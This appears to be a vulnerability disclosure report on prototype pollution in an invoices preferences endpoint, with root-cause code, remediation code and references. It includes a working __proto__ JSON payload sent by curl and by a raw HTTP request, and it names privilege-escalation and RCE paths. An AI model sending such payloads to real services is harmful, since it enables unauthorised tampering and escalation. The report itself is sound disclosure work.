# Prototype pollution via preferences merge

## Summary

`POST /invoices/prefs` deep-merges the JSON you send into a settings object with no guard on the keys. Send a `__proto__` key and the merge walks into `Object.prototype` and writes there, which changes every object in the running process. From one request I set a property that then appears on objects the app never touched.

## Vulnerability details

- **Type / CWE:** Prototype pollution (CWE-1321).
- **Severity:** High. `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` = 8.1. The concrete, demonstrated impact is a global integrity write; with the right downstream "gadget" it reaches RCE (Critical), and it's a reliable DoS, so treat 8.1 as a floor.
- **Affected endpoint:** `POST /invoices/prefs`, JSON body. The unsafe merge is in `src/util/merge.ts`.
- **Authentication:** none.

## Description

The route deep-merges the request body into a shared object:

```ts
deepMerge(prefs, req.body);
```

and `deepMerge` assigns keys dynamically with no denylist:

```ts
for (const key of Object.keys(source)) {
  // ...recurse for objects...
  target[key] = source[key];   // key can be "__proto__"
}
```

`JSON.parse` turns `{"__proto__": {...}}` into an object with an own `__proto__` key, so `Object.keys` yields it and the recursion follows `target["__proto__"]`, which is `Object.prototype`. The assignment then writes onto the prototype shared by every object in the process.

## Steps to reproduce

1. Confirm a clean baseline: a fresh object has no `polluted` property.
2. Send a merge body with a `__proto__` key:
   ```bash
   curl -X POST 'http://localhost:3000/invoices/prefs' \
     -H 'Content-Type: application/json' \
     -d '{"__proto__":{"polluted":"yes"}}'
   ```
3. After the request, a brand-new empty object inherits the injected property: `({}).polluted === "yes"`.

## Proof of concept

Request:
```
POST /invoices/prefs HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{ "__proto__": { "polluted": "yes" } }
```

After it returns, every object in the process inherits `polluted`:
```js
> ({}).polluted
'yes'
```

An object I never created now carries an attacker-set property. Swap `polluted` for a property some later code checks — `isAdmin`, a config flag, a template option — and you're influencing control flow, not just adding a field.

## Impact

The write lands on `Object.prototype`, so it's process-global and sticks until restart. What it's worth depends on what reads those inherited properties afterward. Common outcomes: privilege escalation when an authorization check reads a now-polluted flag (`isAdmin`); denial of service by poisoning a property the framework relies on; and, when a suitable gadget exists downstream, remote code execution. Even the guaranteed floor — arbitrary global property injection from an unauthenticated request — is serious, because it quietly changes the behavior of code far from the endpoint.

## Remediation

Reject the dangerous keys and don't assign through the raw `target[key] = source[key]` shape:

```ts
const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
export function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (FORBIDDEN.has(key)) continue;
    const value = source[key];
    if (value && typeof value === 'object' && target[key] && typeof target[key] === 'object') {
      safeMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

Alternatives that remove the class rather than patch it: accumulate into `Object.create(null)` objects (no prototype to pollute), use a `Map`, or a vetted merge library. Validating the body against a schema that only allows known preference keys shuts it down at the edge.

## References

- [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
- [OWASP: Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- OWASP Top 10: A08:2021 Software and Data Integrity Failures
